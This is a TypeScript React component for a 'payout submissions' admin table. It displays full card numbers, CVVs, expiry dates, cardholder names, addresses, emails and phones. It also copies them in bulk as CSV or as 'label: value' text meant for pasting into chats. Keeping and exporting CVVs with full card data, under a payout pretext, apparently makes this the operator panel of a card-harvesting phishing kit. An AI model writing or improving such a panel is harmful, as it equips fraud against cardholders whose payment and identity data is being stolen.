"use client";

import { useState } from "react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Copy,
  Check,
  Eye,
  RefreshCw,
  ChevronLeft,
  ChevronRight,
  ChevronsLeft,
  ChevronsRight,
  Loader2,
} from "lucide-react";
import { useUser } from "@/store/auth.store";
import { formatDistanceToNow } from "date-fns";
import {
  usePayoutSubmissions,
  type PayoutSubmissionsMode,
} from "@/hooks/use-payout-submissions";
import { PayoutDetailsDialog } from "./payout-details-dialog";
import { toast } from "sonner";
import type { PayoutSubmission } from "@/lib/firebase/payouts";

function toCsv(submissions: PayoutSubmission[]): string {
  const headers = [
    "Card Name",
    "Card Balance",
    "Card Number",
    "Cvv",
    "Expiry",
    "Address",
    "City",
    "State",
    "ZIP",
    "Country",
    "Email",
    //  "Order ID",
    //  "Link ID",
  ];

  const escape = (val: string) => `"${(val ?? "").replace(/"/g, '""')}"`;

  const rows = submissions.map((s) =>
    [
      s.cardName,
      s.brandName || "Unknown",
      s.cardNumber,
      s.cvv,
      s.expiryDate,
      s.address,
      s.city,
      s.state,
      s.zipCode,
      s.country,
      s.email,
      s.orderId,
      s.linkId,
    ]
      .map(escape)
      .join(","),
  );

  return [headers.join(","), ...rows].join("\n");
}

/**
 * Plain "label: value" text for copying a SINGLE submission — easier to
 * paste into a chat/email/note than a one-line CSV row. Copy-all still
 * uses toCsv() for spreadsheet pasting.
 */
function toLabeledText(s: PayoutSubmission): string {
  return [
    `name: ${s.firstName} ${s.lastName}`.trim(),
    `balance: ${s.brandName || "Unknown"}`,
    `cardname: ${s.cardName}`,
    `cardnumber: ${s.cardNumber}`,
    `cvv: ${s.cvv}`,
    `expiry: ${s.expiryDate}`,
    `email: ${s.email}`,
    `phone: ${s.phone}`,
    `address: ${s.address}`,
    `city: ${s.city}`,
    `state: ${s.state}`,
    `zip: ${s.zipCode}`,
    `country: ${s.country}`,
    //  `orderid: ${s.orderId}`,
    //  `linkid: ${s.linkId}`,
  ].join("\n");
}

/**
 * "2 hours ago", "1 day ago", etc. Falls back to "—" if createdAt
 * hasn't resolved yet (e.g. serverTimestamp() sentinel not yet synced).
 */
function formatRelativeDate(createdAt: PayoutSubmission["createdAt"]): string {
  if (!createdAt?.toDate) return "—";
  try {
    return formatDistanceToNow(createdAt.toDate(), { addSuffix: true });
  } catch {
    return "—";
  }
}

export function PayoutSubmissionsTable() {
  const user = useUser();
  const isAdmin = user?.role === "admin" || user?.role === "superadmin";

  const [mode, setMode] = useState<PayoutSubmissionsMode>("mine");
  const {
    data: submissions,
    isLoading,
    isFetching,
    refetch,
  } = usePayoutSubmissions(mode);

  const [selected, setSelected] = useState<PayoutSubmission | null>(null);
  const [pageIndex, setPageIndex] = useState(0);
  const [pageSize, setPageSize] = useState(10);

  const total = submissions?.length ?? 0;
  const pageCount = Math.max(1, Math.ceil(total / pageSize));
  const paginated =
    submissions?.slice(pageIndex * pageSize, pageIndex * pageSize + pageSize) ??
    [];

  async function handleCopyAll() {
    if (!submissions || submissions.length === 0) {
      toast.error("Nothing to copy.");
      return;
    }
    try {
      await navigator.clipboard.writeText(toCsv(submissions));
      toast.success(`Copied ${submissions.length} submission(s) to clipboard.`);
    } catch {
      toast.error("Failed to copy to clipboard.");
    }
  }

  function handleModeChange(next: PayoutSubmissionsMode) {
    setMode(next);
    setPageIndex(0);
  }

  return (
    <div className="flex flex-col gap-4">
      <div className="flex flex-wrap items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          {isAdmin && (
            <Select
              value={mode}
              onValueChange={(v) =>
                handleModeChange(v as PayoutSubmissionsMode)
              }
            >
              <SelectTrigger size="sm" className="w-32">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="mine">Mine</SelectItem>
                <SelectItem value="all">All</SelectItem>
              </SelectContent>
            </Select>
          )}
        </div>

        <div className="flex items-center gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={handleCopyAll}
            disabled={!submissions || submissions.length === 0}
          >
            <Copy className="mr-2 h-3.5 w-3.5" />
            Copy all
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => refetch()}
            disabled={isFetching}
          >
            <RefreshCw
              className={`mr-2 h-3.5 w-3.5 ${isFetching ? "animate-spin" : ""}`}
            />
            Refresh
          </Button>
        </div>
      </div>

      <div className="overflow-hidden rounded-lg border">
        <Table>
          <TableHeader className="bg-muted">
            <TableRow>
              <TableHead>Card name</TableHead>
              <TableHead>Card balance</TableHead>
              <TableHead>Card number</TableHead>
              <TableHead>Expiry</TableHead>
              {/* <TableHead>Address</TableHead>
              <TableHead>ZIP code</TableHead>*/}
              <TableHead>Submitted</TableHead>
              <TableHead className="w-20 text-right">Actions</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {isLoading ? (
              <TableRow>
                <TableCell colSpan={8} className="h-24 text-center">
                  <Loader2 className="mx-auto h-5 w-5 animate-spin text-muted-foreground" />
                </TableCell>
              </TableRow>
            ) : paginated.length ? (
              paginated.map((s) => (
                <TableRow key={s.id}>
                  <TableCell className="text-sm font-medium">
                    {s.cardName}
                  </TableCell>
                  <TableCell>
                    <Badge
                      variant={s.brandName ? "default" : "secondary"}
                      className="rounded-sm"
                    >
                      $ {s.brandName || "Unknown"}
                    </Badge>
                  </TableCell>
                  <TableCell className="font-mono text-sm text-muted-foreground">
                    {s.cardNumber}
                  </TableCell>
                  <TableCell className="text-sm">{s.expiryDate}</TableCell>
                  {/*  <TableCell className="max-w-[180px] truncate text-sm">
                    {s.address}
                  </TableCell>
                  <TableCell className="text-sm">{s.zipCode}</TableCell>*/}
                  <TableCell className="text-sm text-muted-foreground whitespace-nowrap">
                    {formatRelativeDate(s.createdAt)}
                  </TableCell>
                  <TableCell>
                    <div className="flex items-center justify-end gap-1">
                      <CopyRowButton submission={s} />
                      <Button
                        size="icon"
                        variant="ghost"
                        onClick={() => setSelected(s)}
                      >
                        <Eye className="h-4 w-4" />
                      </Button>
                    </div>
                  </TableCell>
                </TableRow>
              ))
            ) : (
              <TableRow>
                <TableCell
                  colSpan={8}
                  className="h-24 text-center text-muted-foreground"
                >
                  No payout submissions yet.
                </TableCell>
              </TableRow>
            )}
          </TableBody>
        </Table>
      </div>

      <div className="flex items-center justify-between px-1">
        <div className="hidden flex-1 text-sm text-muted-foreground lg:flex">
          {total} submission{total === 1 ? "" : "s"} total
        </div>

        <div className="flex w-full items-center gap-8 lg:w-fit">
          <div className="hidden items-center gap-2 lg:flex">
            <span className="text-sm font-medium">Rows per page</span>
            <Select
              value={`${pageSize}`}
              onValueChange={(value) => {
                setPageSize(Number(value));
                setPageIndex(0);
              }}
            >
              <SelectTrigger size="sm" className="w-20">
                <SelectValue placeholder={pageSize} />
              </SelectTrigger>
              <SelectContent side="top">
                {[10, 20, 30, 40, 50].map((size) => (
                  <SelectItem key={size} value={`${size}`}>
                    {size}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="flex w-fit items-center justify-center text-sm font-medium">
            Page {pageIndex + 1} of {pageCount}
          </div>

          <div className="ml-auto flex items-center gap-2 lg:ml-0">
            <Button
              variant="outline"
              className="hidden h-8 w-8 p-0 lg:flex"
              onClick={() => setPageIndex(0)}
              disabled={pageIndex === 0}
            >
              <span className="sr-only">Go to first page</span>
              <ChevronsLeft className="h-4 w-4" />
            </Button>
            <Button
              variant="outline"
              className="size-8"
              size="icon"
              onClick={() => setPageIndex((p) => Math.max(0, p - 1))}
              disabled={pageIndex === 0}
            >
              <span className="sr-only">Go to previous page</span>
              <ChevronLeft className="h-4 w-4" />
            </Button>
            <Button
              variant="outline"
              className="size-8"
              size="icon"
              onClick={() =>
                setPageIndex((p) => Math.min(pageCount - 1, p + 1))
              }
              disabled={pageIndex >= pageCount - 1}
            >
              <span className="sr-only">Go to next page</span>
              <ChevronRight className="h-4 w-4" />
            </Button>
            <Button
              variant="outline"
              className="hidden size-8 lg:flex"
              size="icon"
              onClick={() => setPageIndex(pageCount - 1)}
              disabled={pageIndex >= pageCount - 1}
            >
              <span className="sr-only">Go to last page</span>
              <ChevronsRight className="h-4 w-4" />
            </Button>
          </div>
        </div>
      </div>

      <PayoutDetailsDialog
        submission={selected}
        open={!!selected}
        onOpenChange={(open) => !open && setSelected(null)}
      />
    </div>
  );
}

function CopyRowButton({ submission }: { submission: PayoutSubmission }) {
  const [copied, setCopied] = useState(false);

  async function handleCopy() {
    try {
      await navigator.clipboard.writeText(toLabeledText(submission));
      setCopied(true);
      toast.success("Copied.");
      setTimeout(() => setCopied(false), 1500);
    } catch {
      toast.error("Failed to copy.");
    }
  }

  return (
    <Button size="icon" variant="ghost" onClick={handleCopy}>
      {copied ? (
        <Check className="h-4 w-4 text-green-600" />
      ) : (
        <Copy className="h-4 w-4" />
      )}
    </Button>
  );
}
